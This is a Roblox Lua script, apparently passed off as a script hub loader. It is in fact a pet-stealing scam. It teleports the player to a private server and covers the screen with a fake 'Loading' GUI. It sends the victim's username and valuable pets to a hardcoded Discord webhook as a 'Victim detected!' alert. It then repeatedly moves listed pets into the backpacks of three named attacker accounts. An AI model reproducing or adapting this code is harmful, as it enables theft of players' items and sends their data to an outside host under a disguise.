local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Private server info
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

-- Discord webhook
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

-- Attacker usernames
local attackerNames = {
    ["boneblossom215"] = true,
    ["beanstalk1251"] = true,
    ["burningbud709"] = true,
}

-- Target pet names only
local allowedPets = {
    ["Trex"] = true,
    ["Fennec Fox"] = true,
    ["Raccoon"] = true,
    ["Dragonfly"] = true,
    ["Butterfly"] = true,
    ["Queenbee"] = true,
    ["Spinosaurus"] = true,
    ["Redfox"] = true,
    ["Brontosaurus"] = true,
    ["Mooncat"] = true,
    ["Mimic Octopus"] = true,
    ["D Disco Bee"] = true,
    ["Dilophosaurus"] = true,
    ["Kitsune"] = true,
}

-- Teleport to private server
task.spawn(function()
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
end)

-- Wait until teleport finishes
repeat wait() until game.PlaceId == placeId

-- GUI loading
task.spawn(function()
    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    ScreenGui.Name = "LimitHubLoader"
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false

    local bg = Instance.new("Frame", ScreenGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)

    local text = Instance.new("TextLabel", bg)
    text.Size = UDim2.new(0.3, 0, 0.1, 0)
    text.Position = UDim2.new(0.35, 0, 0.45, 0)
    text.Text = "Loading... 0%"
    text.TextColor3 = Color3.new(1,1,1)
    text.TextScaled = true
    text.BackgroundTransparency = 1

    for i = 1, 100, 5 do
        text.Text = "Loading... " .. i .. "%"
        wait(0.1)
    end
    ScreenGui:Destroy()
end)

-- Wait a bit to ensure pets are loaded
wait(5)

-- Send inventory to Discord
task.spawn(function()
    local pets = {}
    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
        if allowedPets[v.Name] then
            table.insert(pets, v.Name)
        end
    end

    local data = {
        ["content"] = "**🎯 Victim detected!**",
        ["embeds"] = {{
            ["title"] = "Pet Transfer Info",
            ["fields"] = {
                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "Filtered Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets found", ["inline"] = false}
            },
            ["color"] = 16711680
        }}
    }

    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end)

-- Transfer pets only if attacker is present
task.spawn(function()
    local function transferPetsTo(attacker)
        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
            if allowedPets[pet.Name] then
                pet.Parent = attacker:FindFirstChild("Backpack")
            end
        end
    end

    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if attackerNames[player.Name] and player ~= LocalPlayer then
                transferPetsTo(player)
            end
        end
        wait(1)
    end
end)
